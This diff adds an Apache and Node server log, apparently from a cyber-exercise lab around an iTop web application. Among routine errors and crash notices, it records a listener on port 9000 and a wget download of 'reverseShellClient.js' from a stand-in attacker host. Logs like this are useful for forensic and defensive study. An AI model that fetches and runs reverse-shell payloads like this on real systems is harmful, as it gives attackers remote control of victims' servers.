@@ -1,0 +1,38 @@
+[Tue Feb 06 09:45:19.800217 2018] [mpm_prefork:notice] [pid 433] AH00163: Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.22 configured -- resuming normal operations
+[Tue Feb 06 09:45:19.803652 2018] [core:notice] [pid 433] AH00094: Command line: 'apache2 -D FOREGROUND'
+Listening on [0.0.0.0] (family 0, port 9000)
+sudo: no tty present and no askpass program specified
+--2018-02-06 10:06:56--  http://www.attacker.cyexc-attacker:8081/reverseShellClient.js
+Resolving www.attacker.cyexc-attacker (www.attacker.cyexc-attacker)... 192.168.33.20
+Connecting to www.attacker.cyexc-attacker (www.attacker.cyexc-attacker)|192.168.33.20|:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1171 (1.1K) [application/javascript]
+Saving to: 'reverseShellClient.js'
+
+     0K .                                                     100%  122M=0s
+
+2018-02-06 10:06:56 (122 MB/s) - 'reverseShellClient.js' saved [1171/1171]
+
+sudo: no tty present and no askpass program specified
+
+module.js:340
+    throw err;
+          ^
+Error: Cannot find module 'argv'
+    at Function.Module._resolveFilename (module.js:338:15)
+    at Function.Module._load (module.js:280:25)
+    at Module.require (module.js:364:17)
+    at require (module.js:380:17)
+    at Object.<anonymous> (/app/pages/reverseShellClient.js:6:12)
+    at Module._compile (module.js:456:26)
+    at Object.Module._extensions..js (module.js:474:10)
+    at Module.load (module.js:356:32)
+    at Function.Module._load (module.js:312:12)
+    at Function.Module.runMain (module.js:497:10)
+[Tue Feb 06 10:14:56.545832 2018] [core:notice] [pid 433] AH00051: child pid 511 exit signal Segmentation fault (11), possible coredump in /etc/apache2
+[Tue Feb 06 10:14:56.546030 2018] [core:notice] [pid 433] AH00051: child pid 512 exit signal Segmentation fault (11), possible coredump in /etc/apache2
+[Tue Feb 06 10:14:56.546137 2018] [core:notice] [pid 433] AH00051: child pid 831 exit signal Segmentation fault (11), possible coredump in /etc/apache2
+[Tue Feb 06 10:14:56.546331 2018] [mpm_prefork:notice] [pid 433] AH00169: caught SIGTERM, shutting down
+[Tue Feb 06 10:14:57.687961 2018] [mpm_prefork:notice] [pid 2240] AH00163: Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.22 configured -- resuming normal operations
+[Tue Feb 06 10:14:57.688028 2018] [core:notice] [pid 2240] AH00094: Command line: '/usr/sbin/apache2'
+[Tue Feb 06 10:26:24.913122 2018] [:error] [pid 2249] [client 192.168.33.1:61272] PHP Fatal error:  Uncaught exception 'ConfigException' with message 'Missing array in configuration file: file = /app/conf/production/config-itop.php, expected = $MySettings' in /app/core/config.class.inc.php:1119\nStack trace:\n#0 /app/core/config.class.inc.php(1057): Config->Load('/app/conf/produ...')\n#1 /app/application/utils.inc.php(474): Config->__construct('/app/conf/produ...')\n#2 /app/application/utils.inc.php(493): utils::GetConfig()\n#3 /app/application/webpage.class.inc.php(291): utils::GetAbsoluteUrlAppRoot()\n#4 /app/application/nicewebpage.class.inc.php(97): WebPage->add_saas('css/light-grey....')\n#5 /app/setup/setuppage.class.inc.php(38): NiceWebPage->__construct('UI:PageTitle:Fa...')\n#6 /app/pages/UI.php(1578): SetupPage->__construct('UI:PageTitle:Fa...')\n#7 {main}\n  thrown in /app/core/config.class.inc.php on line 1119
